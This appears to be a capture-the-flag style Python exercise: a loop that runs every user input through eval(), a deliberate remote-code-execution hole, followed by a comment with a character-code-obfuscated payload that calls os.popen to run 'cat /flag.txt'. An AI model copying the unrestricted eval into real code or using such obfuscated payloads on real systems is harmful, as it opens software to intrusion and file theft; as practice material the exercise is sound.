while True:
    cmd = input("Next try for RCE:")
    
    try:
        x = eval(cmd)
        print("passed?")
        print(x)
    except Exception as e:
        print(f"Error occurred: {e}")


#getattr(getattr(__import__(''.join(map(chr,[111,115]))),'popen')(''.join(map(chr,[99, 97, 116, 32, 47, 102, 108, 97, 103, 46, 116, 120, 116]))),'read')()
#the ascii is cat /flag.txt
